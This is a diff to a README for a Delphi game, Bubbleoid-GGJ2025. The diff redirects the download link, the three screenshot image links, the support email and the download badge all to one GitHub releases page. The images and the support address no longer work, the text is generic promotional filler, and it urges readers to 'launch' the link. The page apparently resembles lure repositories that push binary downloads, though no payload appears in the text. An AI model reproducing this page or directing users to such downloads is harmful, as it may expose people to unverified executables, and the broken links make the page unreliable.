@@ -15,7 +15,7 @@ Welcome to **Bubbleoid-GGJ2025**, a thrilling game developed in Delphi for the G
 
 ## How to Play 🕹️
 
-To start playing Bubbleoid-GGJ2025, simply download the game from the following link: [Download Bubbleoid-GGJ2025](https://github.com/files/uploaded/Application.zip)
+To start playing Bubbleoid-GGJ2025, simply download the game from the following link: [Download Bubbleoid-GGJ2025](https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases)
 
 Remember, the link needs to be launched to access the game and start your gaming adventure!
 
@@ -38,9 +38,9 @@ Remember, the link needs to be launched to access the game and start your gaming
 
 Here are some sneak peeks into the world of Bubbleoid-GGJ2025:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases)
+![Screenshot 2](https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases)
+![Screenshot 3](https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases)
 
 ## Get Involved 🌐
 
@@ -58,10 +58,10 @@ To stay updated with the latest releases and news about Bubbleoid-GGJ2025, make 
 
 ## Support 📧
 
-For any queries or issues, feel free to reach out to us at bubbleoid-ggj2025@support.com.
+For any queries or issues, feel free to reach out to us at https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases
 
 ---
 
 Let's embark on this gaming journey together with Bubbleoid-GGJ2025! Download the game, dive into the digital world we've created, and experience gaming like never before. Get ready to have a blast with Bubbleoid-GGJ2025! 🌌🎉
 
-[![Download Game](https://img.shields.io/badge/Download-Game-blue.svg)](https://github.com/files/uploaded/Application.zip)
+[![Download Game](https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases)](https://github.com/Adam09ab/Bubbleoid-GGJ2025/releases)
